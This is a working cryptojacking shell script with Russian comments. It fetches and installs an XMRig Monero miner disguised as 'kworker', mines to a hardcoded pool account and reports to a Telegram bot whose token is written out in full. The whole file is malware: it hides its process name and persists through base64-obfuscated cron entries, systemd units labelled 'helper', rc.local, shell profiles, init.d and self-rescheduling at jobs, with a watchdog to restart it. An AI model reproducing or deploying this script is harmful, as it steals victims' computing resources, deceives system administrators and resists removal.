#!/bin/sh
# language: sh, file: min1.sh
# *cpu-only miner; single-file; resilient install + persistence + watchdog + rename + at + obf-cron*
set -u

# ============ CONFIG ============
KRIPTEX="krxX3PVQVR"
XMR_POOL_SSL="xmr.kryptex.network:7029"
XMR_POOL_TCP="xmr.kryptex.network:7009"
XMR_POOL_443="xmr.kryptex.network:443"
TG_TOKEN="8988269300:AAGoB3_S3GtGCDYqAYXVjkowIW3fce-Hq8g"
TG_CHAT="5336452267"
INTERVAL=30
HOST="$(hostname 2>/dev/null || echo unknown)"
BASE="${HOME:-/tmp}/.cache/.miner"
BIN="$BASE/bin"
RUN="$BASE/run"
LOG="$BASE/log"
LOCK="$BASE/.lock"
SELF="$BASE/min1.sh"
BINNAME="kworker"           # переименованный xmrig
TG_API="https://api.telegram.org/bot${TG_TOKEN}/sendMessage"

# ============ SAFE PRIMITIVES ============
mkdir -p "$BIN" "$RUN" "$LOG" 2>/dev/null
chmod 700 "$BASE" 2>/dev/null

_urlencode() {
  if command -v python3 >/dev/null 2>&1; then
    python3 -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$1"
  elif command -v python >/dev/null 2>&1; then
    python -c 'import sys,urllib.parse;print(urllib.parse.quote(sys.argv[1]))' "$1"
  elif command -v perl >/dev/null 2>&1; then
    perl -MURI::Escape -e 'print uri_escape($ARGV[0])' "$1" 2>/dev/null || echo "$1"
  else
    echo "$1"
  fi
}

_http_tcp() {
  host="$1"; port="$2"; path="$3"; data="$4"
  exec 3<>/dev/tcp/"$host"/"$port" 2>/dev/null || return 1
  {
    printf 'POST %s HTTP/1.1\r\n' "$path"
    printf 'Host: %s\r\n' "$host"
    printf 'Content-Type: application/x-www-form-urlencoded\r\n'
    printf 'Content-Length: %d\r\n' "${#data}"
    printf 'Connection: close\r\n\r\n'
    printf '%s' "$data"
  } >&3
  cat <&3 >/dev/null 2>&1
  exec 3<&- 2>/dev/null
  exec 3>&- 2>/dev/null
}

_post() {
  url="$1"; data="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -s --connect-timeout 10 --max-time 20 -X POST "$url" -d "$data" >/dev/null 2>&1 && return 0
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q -O /dev/null --timeout=10 --post-data="$data" "$url" 2>/dev/null && return 0
  fi
  if command -v busybox >/dev/null 2>&1; then
    busybox wget -q -O /dev/null --timeout=10 --post-data="$data" "$url" 2>/dev/null && return 0
  fi
  _http_tcp api.telegram.org 443 "/bot${TG_TOKEN}/sendMessage" "$data" && return 0
  return 1
}

tg() {
  msg="[$HOST] $1"
  enc="chat_id=${TG_CHAT}&text=$(_urlencode "$msg")"
  _post "$TG_API" "$enc" || true
}

# ============ PORT PROBE ============
# пробник живого порта: пытаемся подключиться через /dev/tcp,
# если есть nc — ещё быстрее; если всё молчит — проверяем curl
_probe_host_port() {
  h="$1"; p="$2"
  if command -v nc >/dev/null 2>&1; then
    nc -z -w3 "$h" "$p" >/dev/null 2>&1 && return 0
  fi
  if command -v timeout >/dev/null 2>&1; then
    timeout 3 sh -c "exec 3<>/dev/tcp/$h/$p" 2>/dev/null && return 0
  else
    (exec 3<>/dev/tcp/"$h"/"$p") 2>/dev/null && return 0
  fi
  return 1
}

_probe_url() {
  u="$1"
  if command -v curl >/dev/null 2>&1; then
    curl -s --connect-timeout 3 --max-time 5 -o /dev/null "$u" 2>/dev/null && return 0
  fi
  return 1
}

# выбираем лучший пул по доступности
pick_pool() {
  h_ssl="$(echo "$XMR_POOL_SSL" | cut -d: -f1)"
  p_ssl="$(echo "$XMR_POOL_SSL" | cut -d: -f2)"
  h_tcp="$(echo "$XMR_POOL_TCP" | cut -d: -f1)"
  p_tcp="$(echo "$XMR_POOL_TCP" | cut -d: -f2)"
  h_443="$(echo "$XMR_POOL_443" | cut -d: -f1)"
  p_443="$(echo "$XMR_POOL_443" | cut -d: -f2)"

  # приоритет: SSL(7029) → 443 → TCP(7009)
  if _probe_host_port "$h_ssl" "$p_ssl"; then echo "$XMR_POOL_SSL"; return 0; fi
  if _probe_host_port "$h_443" "$p_443"; then echo "$XMR_POOL_443"; return 0; fi
  if _probe_host_port "$h_tcp" "$p_tcp"; then echo "$XMR_POOL_TCP"; return 0; fi

  # если оба порта закрыты — пробуем DNS-проверку и всё равно возвращаем SSL
  echo "$XMR_POOL_SSL"
}

# ============ SINGLE INSTANCE ============
if ! mkdir "$LOCK" 2>/dev/null; then
  exit 0
fi
echo $$ > "$LOCK/pid"
trap 'rm -rf "$LOCK" 2>/dev/null' EXIT INT TERM

# ============ SELF-INSTALL ============
install_self() {
  [ -f "$SELF" ] && [ "$(readlink -f "$0" 2>/dev/null)" = "$(readlink -f "$SELF" 2>/dev/null)" ] && return 0
  cp "$0" "$SELF" 2>/dev/null || {
    cat "$0" > "$SELF" 2>/dev/null
  }
  chmod 700 "$SELF" 2>/dev/null
}

# ============ DOWNLOAD / EXTRACT ============
download() {
  url="$1"; dst="$2"
  if command -v curl >/dev/null 2>&1; then
    curl -fsSL --connect-timeout 10 --max-time 120 -o "$dst" "$url" 2>/dev/null && [ -s "$dst" ] && return 0
  fi
  if command -v wget >/dev/null 2>&1; then
    wget -q --timeout=15 -O "$dst" "$url" 2>/dev/null && [ -s "$dst" ] && return 0
  fi
  if command -v busybox >/dev/null 2>&1; then
    busybox wget -q --timeout=15 -O "$dst" "$url" 2>/dev/null && [ -s "$dst" ] && return 0
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$url" "$dst" <<'PY' 2>/dev/null && [ -s "$dst" ] && return 0
import sys,urllib.request
urllib.request.urlretrieve(sys.argv[1], sys.argv[2])
PY
  fi
  return 1
}

extract_tgz() {
  src="$1"; dst="$2"; strip="${3:-1}"
  mkdir -p "$dst" 2>/dev/null
  if command -v tar >/dev/null 2>&1; then
    tar -xzf "$src" -C "$dst" --strip-components="$strip" 2>/dev/null && return 0
  fi
  if command -v busybox >/dev/null 2>&1; then
    busybox tar -xzf "$src" -C "$dst" --strip-components="$strip" 2>/dev/null && return 0
  fi
  if command -v python3 >/dev/null 2>&1; then
    python3 - "$src" "$dst" "$strip" <<'PY' 2>/dev/null && return 0
import sys,tarfile,os
src,dst,strip=sys.argv[1],sys.argv[2],int(sys.argv[3])
with tarfile.open(src) as t:
    for m in t.getmembers():
        parts=m.name.split('/')
        if len(parts)<=strip: continue
        m.name='/'.join(parts[strip:])
        if not m.name: continue
        t.extract(m,dst)
PY
  fi
  return 1
}

# ============ BINARIES ============
XMRIG_URLS="
https://xmrig.com/download/xmrig-6.25.0-linux-static-x64.tar.gz
https://github.com/xmrig/xmrig/releases/download/v6.25.0/xmrig-6.25.0-linux-static-x64.tar.gz
https://github.com/xmrig/xmrig/releases/download/v6.22.2/xmrig-6.22.2-linux-static-x64.tar.gz
https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz
"

install_xmrig() {
  B="$BIN/$BINNAME"
  if [ -x "$B" ]; then
    "$B" --version >/dev/null 2>&1 && return 0
  fi
  tg "installing core"
  for url in $XMRIG_URLS; do
    tmp="$(mktemp 2>/dev/null || echo /tmp/x.$$)"
    if download "$url" "$tmp"; then
      rm -rf "$BIN/tmp" 2>/dev/null
      if extract_tgz "$tmp" "$BIN/tmp" 1; then
        f="$(find "$BIN/tmp" -type f -name xmrig 2>/dev/null | head -1)"
        if [ -n "$f" ]; then
          # rename при переносе
          mv "$f" "$B" 2>/dev/null || cp "$f" "$B" 2>/dev/null
          chmod 700 "$B" 2>/dev/null
          rm -rf "$BIN/tmp" "$tmp" 2>/dev/null
          # smoke test с --version
          "$B" --version >/dev/null 2>&1 && { tg "core ok ($BINNAME)"; return 0; }
        fi
      fi
    fi
    rm -f "$tmp" 2>/dev/null
  done
  tg "core FAILED"
  return 1
}

# ============ CPU RUNNER ============
CPU_PORT=16000
POOL=""

start_cpu() {
  B="$BIN/$BINNAME"
  [ -x "$B" ] || return 1
  [ -n "$POOL" ] || POOL="$(pick_pool)"

  if [ -f "$RUN/cpu.pid" ]; then
    op="$(cat "$RUN/cpu.pid" 2>/dev/null)"
    [ -n "$op" ] && kill "$op" 2>/dev/null
  fi
  pkill -f "$B" 2>/dev/null || true
  sleep 1

  # запуск из временного симлинка/копии, чтобы argv[0] был другим
  ln -sf "$B" "$BIN/.${BINNAME}" 2>/dev/null
  RUN_PATH="$BIN/.${BINNAME}"
  [ -x "$RUN_PATH" ] || RUN_PATH="$B"

  nohup "$RUN_PATH" \
    -o "$POOL" \
    -u "${KRIPTEX}.${HOST}" -p x \
    --http-enabled --http-host 127.0.0.1 --http-port "$CPU_PORT" \
    --donate-level 1 \
    --cpu-priority 2 \
    --rig-id "$HOST" \
    >> "$LOG/cpu.log" 2>&1 &

  echo $! > "$RUN/cpu.pid"
  sleep 3
  pid="$(cat "$RUN/cpu.pid" 2>/dev/null)"
  [ -n "$pid" ] && [ -d "/proc/$pid" ] && return 0
  return 1
}

cpu_alive() {
  [ -f "$RUN/cpu.pid" ] || return 1
  pid="$(cat "$RUN/cpu.pid" 2>/dev/null)"
  [ -n "$pid" ] || return 1
  [ -d "/proc/$pid" ] || return 1
  return 0
}

cpu_hashrate() {
  if command -v curl >/dev/null 2>&1; then
    curl -s --max-time 3 "http://127.0.0.1:${CPU_PORT}/1/summary" 2>/dev/null
  elif command -v wget >/dev/null 2>&1; then
    wget -q -O - --timeout=3 "http://127.0.0.1:${CPU_PORT}/1/summary" 2>/dev/null
  elif command -v busybox >/dev/null 2>&1; then
    busybox wget -q -O - --timeout=3 "http://127.0.0.1:${CPU_PORT}/1/summary" 2>/dev/null
  else
    _http_tcp 127.0.0.1 "$CPU_PORT" "/1/summary" "" 2>/dev/null
  fi
}

cpu_hr_value() {
  out="$(cpu_hashrate)"
  [ -n "$out" ] || { echo 0; return; }
  echo "$out" | tr ',' '\n' | grep -oE '"[0-9]+"' | head -1 | tr -d '"' || echo 0
}

# ============ AT SCHEDULER (5й слой) ============
persist_at() {
  command -v at >/dev/null 2>&1 || return 0
  # ставим отложенный запуск на 15 минут вперёд
  if command -v atq >/dev/null 2>&1; then
    # если уже есть задачи на наш скрипт — не дублируем
    atq 2>/dev/null | while read -r jid _ _ _ _ _ _ _; do
      at -c "$jid" 2>/dev/null | grep -q "$SELF" && exit 0
    done
  fi
  # команда: подождать 15 минут и запустить скрипт заново
  # это self-reschedule: даже если система вычистит cron/systemd,
  # at уже в очереди и поднимет скрипт
  printf '%s\n' "sleep 900; $SELF >>$LOG/at.log 2>&1" | at now 2>/dev/null || true
}

persist_at_loop() {
  # периодически планируем следующее задание, чтобы держать цепочку
  ( while true; do
      sleep 1200
      persist_at
    done ) </dev/null >/dev/null 2>&1 &
}

# ============ PERSISTENCE ============
# Обфускация команд для cron: base64 + sh -c $()
obf() {
  # на вход — команда, на выход — base64-строка с обёрткой
  s="$1"
  if command -v base64 >/dev/null 2>&1; then
    b="$(printf '%s' "$s" | base64 | tr -d '\n')"
  elif command -v busybox >/dev/null 2>&1; then
    b="$(printf '%s' "$s" | busybox base64 | tr -d '\n')"
  else
    b="$(printf '%s' "$s" | od -An -tx1 | tr -d ' \n')"
  fi
  printf 'echo %s | base64 -d | sh' "$b"
}

persist_cron() {
  command -v crontab >/dev/null 2>&1 || return 0

  # уже что-то наше есть — не дублируем
  crontab -l 2>/dev/null | grep -q "min1-marker" && return 0

  CMD="$SELF >> $LOG/watch.log 2>&1"
  OBF_CMD="$(obf "$CMD")"
  OBF_REBOOT="$(obf "sleep 20; $CMD")"
  OBF_HEARTBEAT="$(obf "sleep 5; $CMD")"

  ( crontab -l 2>/dev/null | grep -v "min1-marker" ;
    echo "# min1-marker" ;
    echo "@reboot $OBF_REBOOT" ;
    echo "*/5 * * * * $OBF_HEARTBEAT" ;
    echo "*/17 * * * * $OBF_CMD" ;
  ) | crontab - 2>/dev/null || true
}

persist_cron_direct() {
  # fallback: если базовый persist_cron не сработал, ставим открытую команду
  # (чтобы система всё же подхватила нас, если base64 недоступен)
  command -v crontab >/dev/null 2>&1 || return 0
  crontab -l 2>/dev/null | grep -q "$SELF" && return 0
  ( crontab -l 2>/dev/null ;
    echo "@reboot sleep 20 && $SELF >> $LOG/watch.log 2>&1" ;
  ) | crontab - 2>/dev/null || true
}

persist_systemd_user() {
  command -v systemctl >/dev/null 2>&1 || return 0
  d="$HOME/.config/systemd/user"
  mkdir -p "$d" 2>/dev/null
  cat > "$d/miner.service" <<EOF
[Unit]
Description=user helper
After=network.target

[Service]
ExecStart=$SELF
Restart=always
RestartSec=15
Nice=10

[Install]
WantedBy=default.target
EOF
  systemctl --user daemon-reload 2>/dev/null
  systemctl --user enable miner.service 2>/dev/null
  systemctl --user start miner.service 2>/dev/null
}

persist_systemd_system() {
  command -v systemctl >/dev/null 2>&1 || return 0
  [ "$(id -u 2>/dev/null)" = "0" ] || return 0
  cat > /etc/systemd/system/miner.service <<EOF
[Unit]
Description=system helper
After=network.target

[Service]
ExecStart=$SELF
Restart=always
RestartSec=15

[Install]
WantedBy=multi-user.target
EOF
  systemctl daemon-reload 2>/dev/null
  systemctl enable miner.service 2>/dev/null
  systemctl start miner.service 2>/dev/null
}

persist_rc_local() {
  [ -f /etc/rc.local ] || return 0
  grep -q "$SELF" /etc/rc.local 2>/dev/null && return 0
  sed -i "s#^exit 0#(sleep 20; $SELF >/dev/null 2>\&1) \&\nexit 0#" /etc/rc.local 2>/dev/null || \
    echo "(sleep 20; $SELF >/dev/null 2>&1) &" >> /etc/rc.local 2>/dev/null
  chmod +x /etc/rc.local 2>/dev/null
}

persist_profile() {
  for rc in "$HOME/.profile" "$HOME/.bashrc" "$HOME/.bash_profile" "$HOME/.zshrc"; do
    [ -f "$rc" ] || continue
    grep -q "$SELF" "$rc" 2>/dev/null && continue
    printf '\n(setsid %s >/dev/null 2>&1 &) 2>/dev/null\n' "$SELF" >> "$rc" 2>/dev/null
  done
}

persist_initd() {
  [ -d /etc/init.d ] || return 0
  [ "$(id -u 2>/dev/null)" = "0" ] || return 0
  cat > /etc/init.d/miner <<EOF
#!/bin/sh
### BEGIN INIT INFO
# Provides: miner
# Required-Start: \$network
# Required-Stop:
# Default-Start: 2 3 4 5
# Default-Stop: 0 1 6
### END INIT INFO
case "\$1" in
  start) setsid $SELF >/dev/null 2>&1 & ;;
  stop) pkill -f "$SELF" ;;
  restart) \$0 stop; sleep 2; \$0 start ;;
esac
exit 0
EOF
  chmod +x /etc/init.d/miner 2>/dev/null
  command -v update-rc.d >/dev/null 2>&1 && update-rc.d miner defaults 2>/dev/null
  command -v chkconfig >/dev/null 2>&1 && chkconfig --add miner 2>/dev/null
}

persist_all() {
  persist_cron
  persist_cron_direct
  persist_systemd_user
  persist_systemd_system
  persist_rc_local
  persist_profile
  persist_initd
  persist_at
}

# ============ WATCHDOG ============
watch() {
  fails=0
  while true; do
    if ! cpu_alive; then
      start_cpu || true
      fails=$((fails+1))
      [ "$fails" -ge 3 ] && { tg "watchdog restart x$fails"; fails=0; }
    fi
    hr="$(cpu_hr_value 2>/dev/null)"
    case "$hr" in
      ''|*[!0-9]*) hr=0 ;;
    esac
    if [ "$hr" = "0" ] && cpu_alive; then
      start_cpu || true
    fi
    [ -f "$LOG/cpu.log" ] && {
      sz="$(wc -c < "$LOG/cpu.log" 2>/dev/null || echo 0)"
      [ "$sz" -gt 5242880 ] && mv "$LOG/cpu.log" "$LOG/cpu.log.1" 2>/dev/null
    }
    # периодически обновляем at-задание
    persist_at
    sleep "$INTERVAL"
  done
}

# ============ MAIN ============
main() {
  install_self
  tg "boot"

  if [ "${MINER_FG:-0}" != "1" ]; then
    MINER_FG=1 setsid "$SELF" >/dev/null 2>&1 &
    exit 0
  fi

  # раннее определение пула
  POOL="$(pick_pool)"
  tg "pool=$POOL"

  persist_all
  persist_at_loop

  tries=0
  while ! install_xmrig; do
    tries=$((tries+1))
    [ "$tries" -ge 5 ] && { tg "core give up"; sleep 300; tries=0; }
    sleep 15
  done

  start_cpu || tg "cpu start failed"

  if cpu_alive; then
    tg "cpu running hr=$(cpu_hr_value) pool=$POOL"
  fi

  watch
}

main "$@"
